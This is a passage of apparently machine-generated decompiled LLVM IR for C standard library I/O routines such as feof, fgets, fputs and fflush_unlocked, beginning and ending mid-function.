  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 0, 1 }
  uselistorder i32 -134551051, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8051615.329 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804b103, { 1, 0 }
  uselistorder label %dec_label_pc_804b100, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b0f4, { 1, 0 }
  uselistorder label %dec_label_pc_804b0c9, { 1, 0 }
  uselistorder label %dec_label_pc_804b08e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b03a, { 1, 0 }
  uselistorder label %dec_label_pc_804b00e, { 1, 0 }
  uselistorder label %dec_label_pc_804af76, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804af43, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804af1a, { 1, 0 }
  uselistorder label %dec_label_pc_804aef1, { 1, 0 }
  uselistorder label %dec_label_pc_804aeb8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804ae5b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ae14, { 1, 0 }
  uselistorder label %dec_label_pc_804ae05, { 1, 0 }
  uselistorder label %dec_label_pc_804adfb, { 1, 0 }
  uselistorder label %dec_label_pc_804ade4, { 1, 0 }
  uselistorder label %dec_label_pc_804ade4.outer, { 2, 0, 1 }
}

define i32 @feof(i32* %arg1) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v12_804b10f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp5, i32* %esi.global-to-local, align 4
  %v1_804b116 = add i32 %tmp5, 52
  %v2_804b116 = inttoptr i32 %v1_804b116 to i32*
  %v3_804b116 = load i32, i32* %v2_804b116, align 4
  %v1_804b119 = icmp eq i32 %v3_804b116, 0
  %v1_804b11b = icmp eq i1 %v1_804b119, false
  br i1 %v1_804b11b, label %dec_label_pc_804b13c.thread, label %dec_label_pc_804b142

dec_label_pc_804b13c.thread:                      ; preds = %entry
  %v2_804b13c16 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804b153

dec_label_pc_804b142:                             ; preds = %entry
  %v1_804b11d = add i32 %tmp5, 56
  store i32 %v12_804b10f, i32* @eax, align 4
  %v2_804b12c = call i32 @__pthread_return_void(i32 %v12_804b10f, i32 134534955)
  %v1_804b134 = call i32 @__pthread_return_0(i32 %v1_804b11d)
  %v0_804b13c.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804b13c = inttoptr i32 %v0_804b13c.pre to i32*
  %v2_804b13c = load i32, i32* %v1_804b13c, align 4
  store i32 %v12_804b10f, i32* @eax, align 4
  %v2_804b14b = call i32 @__pthread_return_void(i32 %v12_804b10f, i32 1)
  br label %dec_label_pc_804b153

dec_label_pc_804b153:                             ; preds = %dec_label_pc_804b13c.thread, %dec_label_pc_804b142
  %v0_804b153 = phi i32 [ %v2_804b13c, %dec_label_pc_804b142 ], [ %v2_804b13c16, %dec_label_pc_804b13c.thread ]
  %v1_804b158 = and i32 %v0_804b153, 4
  ret i32 %v1_804b158

; uselistorder directives
  uselistorder i32 %v12_804b10f, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b153, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804b160 = load i32, i32* @edi, align 4
  %v0_804b161 = load i32, i32* @esi, align 4
  %v0_804b162 = load i32, i32* @ebx, align 4
  %v12_804b163 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804b16a = add i32 %arg3, 52
  %v2_804b16a = inttoptr i32 %v1_804b16a to i32*
  %v3_804b16a = load i32, i32* %v2_804b16a, align 4
  store i32 %v3_804b16a, i32* @edi, align 4
  %v1_804b16d = icmp eq i32 %v3_804b16a, 0
  %v1_804b16f = icmp eq i1 %v1_804b16d, false
  br i1 %v1_804b16f, label %entry.dec_label_pc_804b190_crit_edge, label %dec_label_pc_804b171

entry.dec_label_pc_804b190_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804b190

dec_label_pc_804b171:                             ; preds = %entry
  %v1_804b171 = add i32 %arg3, 56
  store i32 %v1_804b171, i32* @ebx, align 4
  store i32 %v12_804b163, i32* @eax, align 4
  %v2_804b180 = call i32 @__pthread_return_void(i32 %v12_804b163, i32 134534955)
  %v0_804b185 = load i32, i32* @ebx, align 4
  %v1_804b188 = call i32 @__pthread_return_0(i32 %v0_804b185)
  %v0_804b191.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b190

dec_label_pc_804b190:                             ; preds = %entry.dec_label_pc_804b190_crit_edge, %dec_label_pc_804b171
  %v0_804b191 = phi i32 [ %arg3, %entry.dec_label_pc_804b190_crit_edge ], [ %v0_804b191.pre, %dec_label_pc_804b171 ]
  %v0_804b190 = load i32, i32* @edx, align 4
  %v4_804b19a = inttoptr i32 %arg1 to i8*
  %v5_804b19a = call i32 @__GI_fgets_unlocked(i8* %v4_804b19a, i32 %arg2, i32 %v0_804b191, i32 %v0_804b190)
  store i32 %v5_804b19a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b16f, label %dec_label_pc_804b1b9, label %dec_label_pc_804b1a8

dec_label_pc_804b1a8:                             ; preds = %dec_label_pc_804b190
  store i32 %v12_804b163, i32* @eax, align 4
  %v2_804b1b1 = call i32 @__pthread_return_void(i32 %v12_804b163, i32 1)
  %v0_804b1bc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b1b9

dec_label_pc_804b1b9:                             ; preds = %dec_label_pc_804b190, %dec_label_pc_804b1a8
  %v0_804b1bc = phi i32 [ %v5_804b19a, %dec_label_pc_804b190 ], [ %v0_804b1bc.pre, %dec_label_pc_804b1a8 ]
  store i32 %v0_804b162, i32* @ebx, align 4
  store i32 %v0_804b161, i32* @esi, align 4
  store i32 %v0_804b160, i32* @edi, align 4
  ret i32 %v0_804b1bc

; uselistorder directives
  uselistorder i32 %v12_804b163, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b1b9, { 1, 0 }
  uselistorder label %dec_label_pc_804b190, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804b1c4 = load i32, i32* @edi, align 4
  %v0_804b1c5 = load i32, i32* @esi, align 4
  %v0_804b1c6 = load i32, i32* @ebx, align 4
  %v12_804b1c7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804b1ce = add i32 %arg2, 52
  %v2_804b1ce = inttoptr i32 %v1_804b1ce to i32*
  %v3_804b1ce = load i32, i32* %v2_804b1ce, align 4
  store i32 %v3_804b1ce, i32* @edi, align 4
  %v1_804b1d1 = icmp eq i32 %v3_804b1ce, 0
  %v1_804b1d3 = icmp eq i1 %v1_804b1d1, false
  br i1 %v1_804b1d3, label %entry.dec_label_pc_804b1f4_crit_edge, label %dec_label_pc_804b1d5

entry.dec_label_pc_804b1f4_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804b1f4

dec_label_pc_804b1d5:                             ; preds = %entry
  %v1_804b1d5 = add i32 %arg2, 56
  store i32 %v1_804b1d5, i32* @ebx, align 4
  store i32 %v12_804b1c7, i32* @eax, align 4
  %v2_804b1e4 = call i32 @__pthread_return_void(i32 %v12_804b1c7, i32 134534955)
  %v0_804b1e9 = load i32, i32* @ebx, align 4
  %v1_804b1ec = call i32 @__pthread_return_0(i32 %v0_804b1e9)
  %v0_804b1f6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b1f4

dec_label_pc_804b1f4:                             ; preds = %entry.dec_label_pc_804b1f4_crit_edge, %dec_label_pc_804b1d5
  %v0_804b1f6 = phi i32 [ %arg2, %entry.dec_label_pc_804b1f4_crit_edge ], [ %v0_804b1f6.pre, %dec_label_pc_804b1d5 ]
  %v0_804b1f4 = load i32, i32* @edx, align 4
  %v4_804b1fb = inttoptr i32 %arg1 to i8*
  %v5_804b1fb = call i32 @__GI_fputs_unlocked(i8* %v4_804b1fb, i32 %v0_804b1f6, i32 %v0_804b1f4, i32 %v0_804b1f4)
  store i32 %v5_804b1fb, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b1d3, label %dec_label_pc_804b21a, label %dec_label_pc_804b209

dec_label_pc_804b209:                             ; preds = %dec_label_pc_804b1f4
  store i32 %v12_804b1c7, i32* @eax, align 4
  %v2_804b212 = call i32 @__pthread_return_void(i32 %v12_804b1c7, i32 1)
  %v0_804b21d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b21a

dec_label_pc_804b21a:                             ; preds = %dec_label_pc_804b1f4, %dec_label_pc_804b209
  %v0_804b21d = phi i32 [ %v5_804b1fb, %dec_label_pc_804b1f4 ], [ %v0_804b21d.pre, %dec_label_pc_804b209 ]
  store i32 %v0_804b1c6, i32* @ebx, align 4
  store i32 %v0_804b1c5, i32* @esi, align 4
  store i32 %v0_804b1c4, i32* @edi, align 4
  ret i32 %v0_804b21d

; uselistorder directives
  uselistorder i32 %v12_804b1c7, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b21a, { 1, 0 }
  uselistorder label %dec_label_pc_804b1f4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804b233 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804b233, i32* @eax, align 4
  %v2_804b238 = call i32 @__pthread_return_void(i32 %v2_804b233, i32 134534955)
  %v1_804b244 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540f0.313 to i32))
  %v0_804b249 = load i32, i32* @global_var_80547a4.314, align 4
  %v8_804b251 = icmp eq i32 %v0_804b249, 1
  %v1_804b252 = icmp eq i1 %v8_804b251, false
  br i1 %v1_804b252, label %dec_label_pc_804b2e9, label %dec_label_pc_804b258

dec_label_pc_804b258:                             ; preds = %entry
  %v0_804b258 = load i32, i32* @global_var_80547a8.315, align 8
  %tmp29 = icmp slt i32 %v0_804b258, 1
  br i1 %tmp29, label %dec_label_pc_804b2e9, label %dec_label_pc_804b265

dec_label_pc_804b265:                             ; preds = %dec_label_pc_804b258
  store i32 0, i32* @esi, align 4
  %v2_804b272 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804b272, i32* @eax, align 4
  %v2_804b277 = call i32 @__pthread_return_void(i32 %v2_804b272, i32 134534955)
  %v1_804b283 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540d8.317 to i32))
  %v0_804b288 = load i32, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  store i32 %v0_804b288, i32* %edx.global-to-local, align 4
  %v1_804b2ca3 = icmp eq i32 %v0_804b288, 0
  %v1_804b2cc10 = icmp eq i1 %v1_804b2ca3, false
  br i1 %v1_804b2cc10, label %dec_label_pc_804b293, label %dec_label_pc_804b2ce

dec_label_pc_804b293:                             ; preds = %dec_label_pc_804b265, %dec_label_pc_804b2c8
  %v0_804b2a3 = phi i32 [ %v0_804b2c8, %dec_label_pc_804b2c8 ], [ %v0_804b288, %dec_label_pc_804b265 ]
  %v1_804b29313 = inttoptr i32 %v0_804b2a3 to i16*
  %v2_804b293 = load i16, i16* %v1_804b29313, align 2
  %v1_804b29b = add i32 %v0_804b2a3, 32
  %v2_804b29b = inttoptr i32 %v1_804b29b to i32*
  %v3_804b29b = load i32, i32* %v2_804b29b, align 4
  store i32 %v3_804b29b, i32* @ebx, align 4
  %v1_804b296 = and i16 %v2_804b293, -32720
  %v6_804b29e = icmp eq i16 %v1_804b296, 48
  br i1 %v6_804b29e, label %dec_label_pc_804b2a7, label %dec_label_pc_804b2a3

dec_label_pc_804b2a3:                             ; preds = %dec_label_pc_804b293
  store i32 %v0_804b2a3, i32* @esi, align 4
  br label %dec_label_pc_804b2c8

dec_label_pc_804b2a7:                             ; preds = %dec_label_pc_804b293
  %v0_804b2a7 = load i32, i32* @esi, align 4
  %v1_804b2a7 = icmp eq i32 %v0_804b2a7, 0
  %v1_804b2a9 = icmp eq i1 %v1_804b2a7, false
  br i1 %v1_804b2a9, label %dec_label_pc_804b2b3, label %dec_label_pc_804b2ab

dec_label_pc_804b2ab:                             ; preds = %dec_label_pc_804b2a7
  store i32 %v3_804b29b, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  br label %dec_label_pc_804b2b6

dec_label_pc_804b2b3:                             ; preds = %dec_label_pc_804b2a7
  %v2_804b2b3 = add i32 %v0_804b2a7, 32
  %v3_804b2b3 = inttoptr i32 %v2_804b2b3 to i32*
  store i32 %v3_804b29b, i32* %v3_804b2b3, align 4
  %v0_804b2b6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b2b6

dec_label_pc_804b2b6:                             ; preds = %dec_label_pc_804b2ab, %dec_label_pc_804b2b3
  %v0_804b2bf = phi i32 [ %v0_804b2a3, %dec_label_pc_804b2ab ], [ %v0_804b2b6.pre, %dec_label_pc_804b2b3 ]
  %v1_804b2b6 = add i32 %v0_804b2bf, 1
  %v2_804b2b6 = inttoptr i32 %v1_804b2b6 to i8*
  %v3_804b2b6 = load i8, i8* %v2_804b2b6, align 1
  %v4_804b2b6 = and i8 %v3_804b2b6, 32
  %v5_804b2b6 = icmp eq i8 %v4_804b2b6, 0
  br i1 %v5_804b2b6, label %dec_label_pc_804b2c8, label %dec_label_pc_804b2bc

dec_label_pc_804b2bc:                             ; preds = %dec_label_pc_804b2b6
  %v1_804b2c0 = call i32 @free(i32 %v0_804b2bf)
  br label %dec_label_pc_804b2c8

dec_label_pc_804b2c8:                             ; preds = %dec_label_pc_804b2b6, %dec_label_pc_804b2a3, %dec_label_pc_804b2bc
  %v0_804b2c8 = load i32, i32* @ebx, align 4
  store i32 %v0_804b2c8, i32* %edx.global-to-local, align 4
  %v1_804b2ca = icmp eq i32 %v0_804b2c8, 0
  %v1_804b2cc = icmp eq i1 %v1_804b2ca, false
  br i1 %v1_804b2cc, label %dec_label_pc_804b293, label %dec_label_pc_804b2ce

dec_label_pc_804b2ce:                             ; preds = %dec_label_pc_804b2c8, %dec_label_pc_804b265
  store i32 %v2_804b272, i32* @eax, align 4
  %v2_804b2d7 = call i32 @__pthread_return_void(i32 %v2_804b272, i32 1)
  store i32 0, i32* @global_var_80547a8.315, align 8
  %v0_804b2e9.pre = load i32, i32* @global_var_80547a4.314, align 4
  br label %dec_label_pc_804b2e9

dec_label_pc_804b2e9:                             ; preds = %dec_label_pc_804b258, %entry, %dec_label_pc_804b2ce
  %v0_804b2e9 = phi i32 [ %v0_804b249, %dec_label_pc_804b258 ], [ %v0_804b249, %entry ], [ %v0_804b2e9.pre, %dec_label_pc_804b2ce ]
  %v1_804b2ee = add i32 %v0_804b2e9, -1
  store i32 %v1_804b2ee, i32* @global_var_80547a4.314, align 4
  store i32 %v2_804b233, i32* @eax, align 4
  %v2_804b2fd = call i32 @__pthread_return_void(i32 %v2_804b233, i32 1)
  ret i32 %v2_804b2fd

; uselistorder directives
  uselistorder i32 %v0_804b2c8, { 1, 2, 0 }
  uselistorder i32 %v0_804b2a3, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804b249, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b2e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b2c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b2b6, { 1, 0 }
  uselistorder label %dec_label_pc_804b293, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804b308 = load i32, i32* @ebp, align 4
  %v0_804b309 = load i32, i32* @edi, align 4
  %v0_804b30a = load i32, i32* @esi, align 4
  %v0_804b30b = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804b311 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b311, i32* @ebx, align 4
  %v10_804b315 = icmp eq i16* %arg1, inttoptr (i32 134562004 to i16*)
  br i1 %v10_804b315, label %dec_label_pc_804b32a, label %dec_label_pc_804b31d

dec_label_pc_804b31d:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_804b322 = icmp eq i16* %arg1, null
  %v1_804b324 = icmp eq i1 %v2_804b322, false
  br i1 %v1_804b324, label %dec_label_pc_804b419, label %dec_label_pc_804b32a

dec_label_pc_804b32a:                             ; preds = %dec_label_pc_804b31d, %entry
  store i32 0, i32* @edi, align 4
  %v2_804b337 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b337, i32* @ebx, align 4
  %v2_804b33c = call i32 @__pthread_return_void(i32 %v2_804b337, i32 134534955)
  %v1_804b348 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540f0.313 to i32))
  store i32 ptrtoint (i32* @global_var_80540f0.313 to i32), i32* @ecx, align 4
  %v0_804b34e = load i32, i32* @global_var_80547a4.314, align 4
  %v1_804b354 = add i32 %v0_804b34e, 1
  store i32 %v1_804b354, i32* @eax, align 4
  store i32 %v1_804b354, i32* @global_var_80547a4.314, align 4
  %v2_804b35d = call i32 @__pthread_return_void(i32 %v2_804b337, i32 1)
  store i32 %v2_804b35d, i32* @eax, align 4
  %v2_804b370 = call i32 @__pthread_return_void(i32 %v2_804b337, i32 134534955)
  %v1_804b37c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80540d8.317 to i32))
  store i32 ptrtoint (i32* @global_var_80540d8.317 to i32), i32* @eax, align 4
  %v0_804b385 = load i32, i32* bitcast (i32** @global_var_80540d4.318 to i32*), align 4
  store i32 %v0_804b385, i32* @esi, align 4
  %v2_804b38c = call i32 @__pthread_return_void(i32 %v2_804b337, i32 1)
  %v0_804b40e2 = load i32, i32* @esi, align 4
  %v1_804b40e3 = icmp eq i32 %v0_804b40e2, 0
  %v1_804b41010 = icmp eq i1 %v1_804b40e3, false
  br i1 %v1_804b41010, label %dec_label_pc_804b396, label %dec_label_pc_804b412

dec_label_pc_804b396:                             ; preds = %dec_label_pc_804b32a, %dec_label_pc_804b40b
  %v0_804b3a4 = phi i32 [ %v3_804b40b, %dec_label_pc_804b40b ], [ %v0_804b40e2, %dec_label_pc_804b32a ]
  %v1_804b396 = inttoptr i32 %v0_804b3a4 to i8*
  %v2_804b396 = load i8, i8* %v1_804b396, align 1
  %v3_804b396 = and i8 %v2_804b396, 64
  %v4_804b396 = icmp eq i8 %v3_804b396, 0
  br i1 %v4_804b396, label %dec_label_pc_804b40b, label %dec_label_pc_804b39b

dec_label_pc_804b39b:                             ; preds = %dec_label_pc_804b396
  %v0_804b39b = load i32, i32* @global_var_8054108.316, align 8
  %v9_804b39b = icmp eq i32 %v0_804b39b, 2
  br i1 %v9_804b39b, label %dec_label_pc_804b3c3, label %dec_label_pc_804b3a4

dec_label_pc_804b3a4:                             ; preds = %dec_label_pc_804b39b
  %v1_804b3a4 = add i32 %v0_804b3a4, 56
  store i32 %v1_804b3a4, i32* @ebx, align 4
  store i32 %v2_804b337, i32* @eax, align 4
  %v2_804b3b3 = call i32 @__pthread_return_void(i32 %v2_804b337, i32 134534955)
  %v0_804b3b8 = load i32, i32* @ebx, align 4
  %v1_804b3bb = call i32 @__pthread_return_0(i32 %v0_804b3b8)
  %v1_804b3c5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b3c3

dec_label_pc_804b3c3:                             ; preds = %dec_label_pc_804b39b, %dec_label_pc_804b3a4
  %v0_804b3d5 = phi i32 [ %v0_804b3a4, %dec_label_pc_804b39b ], [ %v1_804b3c5.pre, %dec_label_pc_804b3a4 ]
  %v0_804b3c3 = load i32, i32* @ebp, align 4
  %v2_804b3c5 = inttoptr i32 %v0_804b3d5 to i32*
  %v3_804b3c5 = load i32, i32* %v2_804b3c5, align 4
  %v4_804b3c5 = or i32 %v3_804b3c5, %v0_804b3c3
  %v2_804b3c7 = urem i32 %v4_804b3c5, 65536
  %v9_804b3c7 = and i32 %v2_804b3c7, 832
  %v2_804b3cb = icmp eq i32 %v9_804b3c7, 320
  %v1_804b3d0 = icmp eq i1 %v2_804b3cb, false
  br i1 %v1_804b3d0, label %dec_label_pc_804b3f1, label %dec_label_pc_804b3d2

dec_label_pc_804b3d2:                             ; preds = %dec_label_pc_804b3c3
  %v1_804b3d6 = call i32 @__stdio_wcommit(i32 %v0_804b3d5)
  %v1_804b3de = icmp eq i32 %v1_804b3d6, 0
  br i1 %v1_804b3de, label %dec_label_pc_804b3e7, label %dec_label_pc_804b3e2

dec_label_pc_804b3e2:                             ; preds = %dec_label_pc_804b3d2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804b3f1

dec_label_pc_804b3e7:                             ; preds = %dec_label_pc_804b3d2
  %v0_804b3e7 = load i32, i32* @esi, align 4
  %v1_804b3e7 = inttoptr i32 %v0_804b3e7 to i16*
  %v2_804b3e7 = load i16, i16* %v1_804b3e7, align 2
  %v3_804b3e7 = and i16 %v2_804b3e7, -65
  store i16 %v3_804b3e7, i16* %v1_804b3e7, align 2
  %v0_804b3eb = load i32, i32* @esi, align 4
  %v1_804b3eb = add i32 %v0_804b3eb, 8
  %v2_804b3eb = inttoptr i32 %v1_804b3eb to i32*
  %v3_804b3eb = load i32, i32* %v2_804b3eb, align 4
  %v2_804b3ee = add i32 %v0_804b3eb, 28
  %v3_804b3ee = inttoptr i32 %v2_804b3ee to i32*
  store i32 %v3_804b3eb, i32* %v3_804b3ee, align 4
  br label %dec_label_pc_804b3f1

dec_label_pc_804b3f1:                             ; preds = %dec_label_pc_804b3c3, %dec_label_pc_804b3e2, %dec_label_pc_804b3e7
  %v0_804b3f1 = load i32, i32* @global_var_8054108.316, align 8
  %v9_804b3f1 = icmp eq i32 %v0_804b3f1, 2
  br i1 %v9_804b3f1, label %dec_label_pc_804b40b, label %dec_label_pc_804b3fa

dec_label_pc_804b3fa:                             ; preds = %dec_label_pc_804b3f1
  store i32 %v2_804b337, i32* @eax, align 4
  %v2_804b403 = call i32 @__pthread_return_void(i32 %v2_804b337, i32 1)
  br label %dec_label_pc_804b40b

dec_label_pc_804b40b:                             ; preds = %dec_label_pc_804b3f1, %dec_label_pc_804b396, %dec_label_pc_804b3fa
  %v0_804b40b = load i32, i32* @esi, align 4
  %v1_804b40b = add i32 %v0_804b40b, 32
  %v2_804b40b = inttoptr i32 %v1_804b40b to i32*
  %v3_804b40b = load i32, i32* %v2_804b40b, align 4
  store i32 %v3_804b40b, i32* @esi, align 4
  %v1_804b40e = icmp eq i32 %v3_804b40b, 0
  %v1_804b410 = icmp eq i1 %v1_804b40e, false
  br i1 %v1_804b410, label %dec_label_pc_804b396, label %dec_label_pc_804b412

dec_label_pc_804b412:                             ; preds = %dec_label_pc_804b40b, %dec_label_pc_804b32a
  %v0_804b412 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804b43f

dec_label_pc_804b419:                             ; preds = %dec_label_pc_804b31d
  store i32 0, i32* @edi, align 4
  %tmp24 = bitcast i16* %arg1 to i8*
  %v3_804b41b = load i8, i8* %tmp24, align 1
  %v4_804b41b = and i8 %v3_804b41b, 64
  %v5_804b41b = icmp eq i8 %v4_804b41b, 0
  br i1 %v5_804b41b, label %dec_label_pc_804b43f, label %dec_label_pc_804b420

dec_label_pc_804b420:                             ; preds = %dec_label_pc_804b419
  store i32 -1, i32* @edi, align 4
  %v1_804b427 = call i32 @__stdio_wcommit(i32 %v4_804b311)
  %v1_804b42f = icmp eq i32 %v1_804b427, 0
  %v1_804b431 = icmp eq i1 %v1_804b42f, false
  br i1 %v1_804b431, label %dec_label_pc_804b43f, label %dec_label_pc_804b433

dec_label_pc_804b433:                             ; preds = %dec_label_pc_804b420
  %v3_804b433 = load i16, i16* %arg1, align 2
  %v4_804b433 = and i16 %v3_804b433, -65
  store i16 %v4_804b433, i16* %arg1, align 2
  %v2_804b437 = add i32 %v4_804b311, 8
  %v3_804b437 = inttoptr i32 %v2_804b437 to i32*
  %v4_804b437 = load i32, i32* %v3_804b437, align 4
  %v3_804b43a = add i32 %v4_804b311, 28
  %v4_804b43a = inttoptr i32 %v3_804b43a to i32*
  store i32 %v4_804b437, i32* %v4_804b43a, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804b43f

dec_label_pc_804b43f:                             ; preds = %dec_label_pc_804b420, %dec_label_pc_804b419, %dec_label_pc_804b412, %dec_label_pc_804b433
  %v0_804b442 = load i32, i32* @edi, align 4
  store i32 %v0_804b30b, i32* @ebx, align 4
  store i32 %v0_804b30a, i32* @esi, align 4
  store i32 %v0_804b309, i32* @edi, align 4
  store i32 %v0_804b308, i32* @ebp, align 4
  ret i32 %v0_804b442

; uselistorder directives
  uselistorder i32 %v3_804b40b, { 1, 2, 0 }
  uselistorder i32 %v2_804b337, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_80540d4.318 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_80547a4.314, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80540f0.313 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 1, 2, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804b43f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b40b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b3f1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b3c3, { 1, 0 }
  uselistorder label %dec_label_pc_804b396, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804b44c = load i32, i32* @ebp, align 4
  %v4_804b453 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b453, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804b453, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804b49d.preheader, label %dec_label_pc_804b4a9

dec_label_pc_804b49d.preheader:                   ; preds = %entry
  %v1_804b49d19 = add i32 %arg2, -1
  %v8_804b49d20 = icmp eq i32 %v1_804b49d19, 0
  store i32 %v1_804b49d19, i32* @esi, align 4
  %v1_804b49e21 = icmp eq i1 %v8_804b49d20, false
  br i1 %v1_804b49e21, label %dec_label_pc_804b467, label %dec_label_pc_804b4a0

dec_label_pc_804b467:                             ; preds = %dec_label_pc_804b49d.preheader, %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge.dec_label_pc_804b467_crit_edge
  %v0_804b467 = phi i32 [ %v0_804b467.pre, %dec_label_pc_804b49b.dec_label_pc_804b49d_crit_edge.dec_label_pc_804b467_crit_edge ], [ %arg3, %dec_label_pc_804b49d.preheader ]
  %v1_804b467 = add i32 %v0_804b467, 16
  %v2_804b467 = inttoptr i32 %v1_804b467 to i32*
  %v3_804b467 = load i32, i32* %v2_804b467, align 4
  store i32 %v3_804b467, i32* %eax.global-to-local, align 4
  %v2_804b46a = add i32 %v0_804b467, 24
  %v3_804b46a = inttoptr i32 %v2_804b46a to i32*
  %v4_804b46a = load i32, i32* %v3_804b46a, align 4
  %v10_804b46a = icmp ult i32 %v3_804b467, %v4_804b46a
  %v1_804b46d = icmp eq i1 %v10_804b46a, false
  br i1 %v1_804b46d, label %dec_label_pc_804b47d, label %dec_label_pc_804b46f

dec_label_pc_804b46f:                             ; preds = %dec_label_pc_804b467
  %v1_804b46f = inttoptr i32 %v3_804b467 to i8*
  %v2_804b46f = load i8, i8* %v1_804b46f, align 1
  %v3_804b46f = zext i8 %v2_804b46f to i32
  %v4_804b46f = load i32, i32* @edx, align 4
  %v5_804b46f = and i32 %v4_804b46f, -256
  %v6_804b46f = or i32 %v5_804b46f, %v3_804b46f
  store i32 %v6_804b46f, i32* @edx, align 4
  %v1_804b471 = add i32 %v3_804b467, 1
  store i32 %v1_804b471, i32* %eax.global-to-local, align 4
  %v2_804b472 = load i32, i32* @ebx, align 4
  %v3_804b472 = inttoptr i32 %v2_804b472 to i8*
  store i8 %v2_804b46f, i8* %v3_804b472, align 1
  %v0_804b474 = load i32, i32* @ebx, align 4
  %v1_804b474 = add i32 %v0_804b474, 1
  store i32 %v1_804b474, i32* @ebx, align 4
  %v0_804b475 = load i32, i32* @edx, align 4
  %v1_804b475 = trunc i32 %v0_804b475 to i8
  %v10_804b475 = icmp eq i8 %v1_804b475, 10
  %v0_804b478 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b478 = load i32, i32* @ebp, align 4
  %v2_804b478 = add i32 %v1_804b478, 16
  %v3_804b478 = inttoptr i32 %v2_804b478 to i32*
  store i32 %v0_804b478, i32* %v3_804b478, align 4
